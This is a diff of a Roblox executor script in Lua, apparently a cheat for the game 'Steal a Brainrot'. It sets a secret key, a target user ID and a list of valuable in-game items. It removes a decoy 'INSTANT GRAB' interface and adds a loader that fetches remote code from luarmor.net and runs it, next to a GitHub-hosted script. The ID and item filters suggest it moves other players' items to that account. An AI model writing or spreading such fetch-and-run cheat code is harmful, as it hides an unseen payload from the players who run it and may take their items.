@@ -1,5 +1,5 @@
 local genv = getgenv()
-genv.SECRET_KEY = "shub_b028dddbd6d77d26ae992bdfd0c09cfb"
+genv.SECRET_KEY = "shub_4e46c6a41775924633dc8c342f5b3686"
 genv.TARGET_ID = 6219924104
 genv.MinGeneration = 25000000
 genv.MaxQuantity = 25
@@ -32,32 +32,31 @@ genv.TARGET_BRAINROTS = {
     ["Antonio"] = true,
     ["La Food Combinasion"] = true,
     ["Fragrama and Chocrama"] = true,
-    ["Signore Carapace"] = true,
     ["Elefanto Frigo"] = true,
+    ["Signore Carapace"] = true,
     ["Fortunu and Cashuru"] = true,
     ["Los Amigos"] = true,
     ["Los Sekolahs"] = true,
     ["Sammyni Fattini"] = true,
     ["Cloverat Clapat"] = true,
     ["Fishino Clownino"] = true,
-    ["Jolly Jolly Sahur"] = true,
     ["Gold Gold Gold"] = true,
+    ["Jolly Jolly Sahur"] = true,
     ["Tirilikalika Tirilikalako"] = true,
     ["Dug dug dug"] = true,
     ["Chillin Chili"] = true,
     ["Los Chillis"] = true,
-    ["Swag Soda"] = true,
     ["Cash or Card"] = true,
     ["Digi Narwhal"] = true,
-    ["Los Mariachis"] = true,
     ["Kalika Bros"] = true,
+    ["Los Mariachis"] = true,
     ["Gym Bros"] = true,
     ["Hydra Bunny"] = true,
     ["Bunny and Eggy"] = true,
     ["Boppin Bunny"] = true,
     ["Quackini Snackini"] = true,
     ["Hopilikalika Hopilikalako"] = true,
-    ["Foxini Lanternini"] = true
+    ["Money Money Reindeer"] = true
 }
 local function safeLoadFromUrl(url)
     task.spawn(function()
@@ -71,126 +70,5 @@ local function safeLoadFromUrl(url)
     end)
 end
 
--- [[ SERVICES ]] --
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
--- [[ VARIABLES & CONFIG ]] --
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-local screenGui = Instance.new("ScreenGui", PlayerGui)
-screenGui.Name = "ScannerGui"
--- Configuration Constants
-local PART_COLOR = Color3.fromRGB(170, 85, 255) -- Purple theme
-local CIRCLE_RADIUS = 8
-local PartsCount = 40
-local PART_HEIGHT = 0.2
-local PART_THICKNESS = 0.2
--- State Variables
-local circleParts = {}
-local IsStealing = false
-local StealProgress = 0 -- Value between 0 and 1
--- [[ UI ELEMENTS ]] --
-local bar = Instance.new("Frame", screenGui)
-bar.Size = UDim2.new(0, 220, 0, 18)
-bar.Position = UDim2.new(0.5, -110, 0, 10)
-bar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-bar.BackgroundTransparency = 0.25
-bar.BorderSizePixel = 0
-Instance.new("UICorner", bar)
-local fill = Instance.new("Frame", bar)
-fill.BackgroundColor3 = PART_COLOR
-fill.Size = UDim2.new(0, 0, 1, 0)
-fill.BorderSizePixel = 0
-Instance.new("UICorner", fill)
--- [[ FUNCTIONS ]] --
-local function initializeScanner()
--- This handles the logic for detecting items
-print("Scanner Initialized...")
-end
-local function createCircle(character)
--- Clean up old parts
-for _, p in ipairs(circleParts) do p:Destroy() end
-circleParts = {}
-local root = character:WaitForChild("HumanoidRootPart")
-for i = 1, PartsCount do
-local part = Instance.new("Part")
-part.Anchored = true
-part.CanCollide = false
-part.Material = Enum.Material.Neon
-part.Color = PART_COLOR
-part.Transparency = 0.3
-part.Size = Vector3.new(1, PART_HEIGHT, PART_THICKNESS) -- Size adjusted in RenderStep
-part.Parent = workspace
-table.insert(circleParts, part)
-end
--- Disconnect old connection if it exists
-RunService:UnbindFromRenderStep("CircleFollow")
-RunService:BindToRenderStep("CircleFollow", Enum.RenderPriority.Camera.Value + 1, function()
-if not character or not root.Parent then return end
-for i, part in ipairs(circleParts) do
-local a1 = math.rad((i - 1) / PartsCount * 360)
-local a2 = math.rad(i / PartsCount * 360)
-local p1 = Vector3.new(math.cos(a1), 0, math.sin(a1)) * CIRCLE_RADIUS
-local p2 = Vector3.new(math.cos(a2), 0, math.sin(a2)) * CIRCLE_RADIUS
-local center = (p1 + p2) / 2 + root.Position - Vector3.new(0, 2.5, 0) -- Adjusted to feet level
-part.Size = Vector3.new((p2 - p1).Magnitude, PART_HEIGHT, PART_THICKNESS)
-part.CFrame = CFrame.new(center, center + (p2 - p1)) * CFrame.Angles(0, math.pi / 2, 0)
-end
-end)
-end
-local function showActivateUI()
-local gui = Instance.new("ScreenGui", PlayerGui)
-gui.ResetOnSpawn = false
-gui.DisplayOrder = 1000000
-local main = Instance.new("Frame", gui)
-main.Size = UDim2.new(0, 360, 0, 40)
-main.Position = UDim2.new(0.5, -180, 0, 40)
-main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
-main.BorderSizePixel = 0
-Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
-local line = Instance.new("Frame", main)
-line.Size = UDim2.new(1, -20, 0, 2)
-line.Position = UDim2.new(0, 10, 0, 6)
-line.BackgroundColor3 = PART_COLOR
-line.BorderSizePixel = 0
-Instance.new("UICorner", line).CornerRadius = UDim.new(1, 0)
-local text = Instance.new("TextLabel", main)
-text.Size = UDim2.new(1, -20, 1, -10)
-text.Position = UDim2.new(0, 10, 0, 10)
-text.BackgroundTransparency = 1
-text.Text = "INSTANT GRAB ACTIVATED..."
-text.Font = Enum.Font.GothamBold
-text.TextSize = 14
-text.TextColor3 = Color3.fromRGB(200, 160, 255)
--- Animation
-main.BackgroundTransparency = 1
-text.TextTransparency = 1
-line.BackgroundTransparency = 1
-TweenService:Create(main, TweenInfo.new(0.25), {BackgroundTransparency = 0}):Play()
-TweenService:Create(text, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
-TweenService:Create(line, TweenInfo.new(0.25), {BackgroundTransparency = 0}):Play()
-task.delay(2.2, function()
-TweenService:Create(main, TweenInfo.new(0.25), {BackgroundTransparency = 1}):Play()
-TweenService:Create(text, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
-TweenService:Create(line, TweenInfo.new(0.25), {BackgroundTransparency = 1}):Play()
-task.delay(0.3, function() gui:Destroy() end)
-end)
-end
--- [[ EXECUTION ]] --
-task.spawn(function()
-while task.wait(0.03) do
-if IsStealing then
-fill.Size = UDim2.new(StealProgress, 0, 1, 0)
-else
-fill.Size = UDim2.new(0, 0, 1, 0)
-end
-end
-end)
-initializeScanner()
-showActivateUI()
-if LocalPlayer.Character then
-createCircle(LocalPlayer.Character)
-end
-LocalPlayer.CharacterAdded:Connect(createCircle)
+safeLoadFromUrl("https://api.luarmor.net/files/v4/loaders/6f3e57ce5997b503bb267aff410ad9ea.lua")
 safeLoadFromUrl("https://raw.githubusercontent.com/SHUBSCRIPTS-COM/Shub/refs/heads/main/Script.luau")
